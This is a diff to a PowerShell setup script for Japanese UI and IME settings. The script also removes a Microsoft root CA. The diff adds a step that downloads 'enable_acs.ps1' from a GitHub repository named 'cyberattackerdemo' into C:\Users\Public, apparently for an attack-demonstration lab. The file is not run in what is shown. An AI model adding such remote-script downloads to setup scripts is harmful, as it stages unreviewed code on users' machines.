@@ -102,4 +102,11 @@ Run-Step "Removing Microsoft Identity Verification Root CA 2020 if present" {
     }
 }
 
+Run-Step "Downloading enable_acs.ps1 to Public folder" {
+    $acsScriptUrl = "https://raw.githubusercontent.com/cyberattackerdemo/public/main/enable_acs.ps1"
+    $acsScriptPath = "C:\Users\Public\enable_acs.ps1"
+
+    Invoke-WebRequest -Uri $acsScriptUrl -OutFile $acsScriptPath
+}
+
 Write-Log "Setup completed. Please restart the system to apply the Japanese UI and IME settings."
